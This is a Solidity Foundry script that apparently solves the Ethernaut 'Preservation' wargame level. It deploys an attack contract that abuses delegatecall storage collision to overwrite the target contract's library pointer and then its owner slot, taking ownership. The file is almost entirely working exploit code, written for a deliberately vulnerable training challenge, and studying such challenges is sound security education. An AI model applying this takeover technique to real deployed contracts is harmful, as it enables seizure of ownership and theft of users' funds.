// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console} from "forge-std/console.sol";
import {Script} from "forge-std/Script.sol";
import {Preservation} from "../src/EthernautPreservation.sol";

contract PreservationSolution is Script {
    Preservation preservation =
        Preservation(0x3967B3B96513f552Fd74BB78217597A261b5B0Cd);
    PreservationAttack attacker;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        attacker = new PreservationAttack();
        preservation.setFirstTime(uint256(uint160(address(attacker))));
        preservation.setFirstTime(1);
        vm.stopBroadcast();
        console.log("Current owner after attack", preservation.owner());
    }
}

contract PreservationAttack {
    // Match Preservation's storage layout
    address public timeZone1Library; // slot 0
    address public timeZone2Library; // slot 1
    address public owner; // slot 2 - this is what we want to overwrite

    function setTime(uint256) public {
        // Write to slot 2 (owner) instead of slot 0
        owner = tx.origin; // Make tx.origin the new owner
    }
}
